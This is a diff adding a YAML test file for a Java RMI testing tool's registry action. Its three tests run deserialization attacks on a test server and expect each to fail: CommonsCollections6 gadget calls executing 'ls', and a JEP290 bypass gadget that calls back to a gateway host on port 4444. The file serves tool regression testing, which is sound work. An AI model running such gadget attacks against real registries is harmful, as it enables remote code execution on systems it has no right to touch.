@@ -1,0 +1,61 @@
+tester:
+  name: reg
+  title: Registry Tests
+  description: >
+    "Performs tests on remote-methods-guessers 'reg' action."
+
+
+tests:
+  - title: Gadget Call
+    description: >
+      'Attempts a deserialization attack on the registry endpoint.'
+      'This should fail, as the server uses readString for unmarshaling.'
+
+    command: '${BASE-CMD}'
+    arguments:
+      - reg
+      - CommonsCollections6
+      - ls
+    validators:
+      - error: False
+      - contains:
+          values:
+            - Caught ClassCastException
+            - readString()
+
+
+  - title: Gadget Call (SSL)
+    description: >
+      'Attempts a deserialization attack on the registry endpoint.'
+      'This should fail, as the server uses readString for unmarshaling.'
+
+    command: '${BASE-CMD-SSL}'
+    arguments:
+      - reg
+      - CommonsCollections6
+      - ls
+    validators:
+      - error: False
+      - contains:
+          values:
+            - Caught ClassCastException
+            - readString()
+
+
+  - title: JEP290 Bypass
+    description: >
+      'Attempts a deserialization attack on the registry endpoint,'
+      'using the An Trinh bypass gadget. Should also fail because'
+      'of jdk11.'
+
+    command: '${BASE-CMD-SSL}'
+    arguments:
+      - reg
+      - AnTrinh
+      - ${DOCKER-GW}:4444
+    validators:
+      - error: False
+      - contains:
+          values:
+            - Caught ClassCastException
+            - readString()
